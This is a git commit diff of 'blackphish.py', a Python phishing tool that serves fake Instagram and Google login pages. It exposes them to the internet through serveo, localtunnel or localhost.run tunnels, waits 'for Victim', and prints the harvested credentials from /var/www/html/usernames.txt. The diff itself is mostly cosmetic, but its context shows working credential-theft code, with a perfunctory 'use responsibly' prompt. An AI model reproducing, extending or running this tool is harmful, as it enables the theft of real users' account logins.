33b6212da0771d72b1a39e256c2a0f1478d625a9
inc0gnit0 <iinc0gnit0@pm.me>
2019-12-15 18:18:54 -0600

    Add files via upload

--- blackphish.py
+++ blackphish.py
@@ -10,7 +10,7 @@
 
 
 
-# version 1.6: - Added localhost only - Some touch ups
+# version 1.7: - Code touch ups
 
 # Please update version number each time we update
 
@@ -27,10 +27,16 @@ except ImportError:
     print("\033[31;1m" + "[!] Please run: \"chmod +x install.sh && ./install.sh\"") # Command to run install.sh # 
     exit(1)
 
+
+
 # Variables #
 cwd = getcwd() # Gets working directory
-hostname = gethostname() # Get hostname
+
+hostname = gethostname() # Get hostnameAdded localhost only - Some touch ups
+
 localip = gethostbyname(hostname) # Get local IP by hostname
+
+
 
 # COLORS #
 red = "\033[91;1m"
@@ -43,10 +49,14 @@ blue = "\033[94;1m"
 white = "\033[97;1m"
 blink = "\033[5m"
 
+
+
 # Check for root #
 if geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
-    
+
+
+
 def warning(): # Banner #
     print('''
 \033[91;1m
@@ -77,7 +87,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.6
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.7
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -88,11 +98,14 @@ def warning(): # Banner #
                     
                     Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[93;1m ''')
     print('\n')
-    warningchoice = input("                    Will you use this responsibly(\033[94;1my\033[93;1m/\033[91mn\033[93;1m?): ")
+    warningchoice = input("                    Will you use this responsibly(\033[94;1my\033[93;1m/\033[91mn\033[93;1m?): ") # Agreement Message #
+
     if warningchoice == 'y':
         print("")
     else:
         endMessage()
+
+
 
 def checkInternet(): # Checks for internet connection #
     print(yellow + "[*] Checking connection...")
@@ -103,6 +116,8 @@ def checkInternet(): # Checks for internet connection #
     except OSError: # Checks for OSError #
         print(red + "[!] Internet Not Found" + reset)
         exit(0)
+
+
     
 # Port forward to Serveo #
 def serveoForward():
@@ -110,15 +125,21 @@ def serveoForward():
     sleep(2)
     system('ssh -o ServerAliveInterval=60 -R inc0gnit0:80:localhost:80 serveo.net')
 
+
+
 # Port forward with Localtunnel
 def localTunnel():
     system('lt -p 80 --allow-invalid-cert')
+
+
 
 # Port forward with localhost.run #
 def localhost():
     print(yellow + ' If prompt about RSA key, say yes' + green)
     sleep(2)
     system('ssh -R 80:localhost:80 ssh.localhost.run')
+
+
 
 # Banner #
 def banner():
@@ -151,7 +172,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.6
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v1.7
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -171,6 +192,8 @@ def banner():
         
         
         \033[0m''')
+
+
     
 def endMessage(): # Message when you exit #
     print("\n")
@@ -180,18 +203,24 @@ def endMessage(): # Message when you exit #
     print("\n" + reset)
     exit(0)
 
+
+
 # Main Script #
-def main(): 
+def main():
+
     system("clear") # clear screen #
     
-    checkInternet() # Check internet connection line:98 #
+    checkInternet() # Check internet connection line:107 #
     
-    warning() # Agree to use with responsibily line:51 #
+    warning() # Agree to use with responsibily line:58 #
 
     system('clear') # clear screen #
     
     banner() # Load Banner #
+
     choice = input(red + "        [BlackPhish] -> ") # Get user input #
+
+
 
     # Host Instagram Page #
     if choice == "1":
@@ -205,7 +234,6 @@ def main():
         
         
         # If select Instagram #
-        
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -231,7 +259,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward line:109 #
+            serveoForward() # Serveo port forward line:120 #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -269,7 +297,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward line:112 #
+            localTunnel() # Localtunnel port forward line:128 #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -307,7 +335,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:114 #Instagram
+            localhost() # Localhost.run port forward line:134 #
             while True: # Waits for content on usernames.txt #
                 with open('/var/www/html/usernames.txt') as creds:
                     lines = creds.read().rstrip()
@@ -362,7 +390,6 @@ def main():
 
 
     # If select Google #
-
     elif choice == '2':
         print('\n')
         print(red + '           [1]' + blue + ' Serveo (recommended)')
@@ -370,7 +397,7 @@ def main():
         print(red + '           [3]' + blue + ' localhost.run')
         print(red + '           [4]' + blue + ' Localhost only\n\n')
         choice1 = input(red + "        [BlackPhish-Google] -> ")
-        
+
         if choice1 == '1':
             system("clear")
             print(green + '[+] Copying Files')
@@ -396,7 +423,7 @@ def main():
             print(yellow + "\n[*] Local hosted: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Serveo')
-            serveoForward() # Serveo port forward line:109 #
+            serveoForward() # Serveo port forward line:120 #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True:
@@ -434,7 +461,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localtunnel')
-            localTunnel() # Localtunnel port forward line:112 #
+            localTunnel() # Localtunnel port forward line:128 #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -446,7 +473,7 @@ def main():
                         system("cat /var/www/html/usernames.txt")
                         print("\n______________________________________________________________________________" + reset)
                         endMessage()
-                        
+
         elif choice1 == '3':
             system("clear")
             print(green + '[+] Copying Files')
@@ -472,7 +499,7 @@ def main():
             print(yellow + "\n[*] Local: " + green + localip + "\n") # Shows where site is hosted locally #
             sleep(0.1)
             print(yellow + '[*] Starting Localhost.run')
-            localhost() # Localhost.run port forward line:114 #
+            localhost() # Localhost.run port forward line:134 #
             print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
             sleep(0.1)
             while True: # Waits for content on usernames.txt #
@@ -484,6 +511,7 @@ def main():
                         system("cat /var/www/html/usernames.txt")
                         print("\n______________________________________________________________________________" + reset)
                         endMessage()
+
         elif choice1 == '4':
             system("clear")
             print(green + '[+] Copying Files')
@@ -525,6 +553,8 @@ def main():
             sleep(1)
             main()
 
+
+
     # Clean out everything #
     elif choice == "0":
         print(green + '[+] Stopping Apache2 Service')
@@ -537,21 +567,27 @@ def main():
         system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes and makes /Server/www
         print(green + '[+] Done')
         main()
-    
+
+
+
     # Exit #
     elif choice == 'x':
         endMessage()
+
+
 
     # Invalid Option Error #
     else:
         print(red + "[!] Invalid option" + reset)
         main()
-        
+
+
+
 # This will start the script #
 try:
     if __name__ == '__main__':
         main()
-        
+
 # Will detect if they exit #
 except KeyboardInterrupt:
     print("\n")
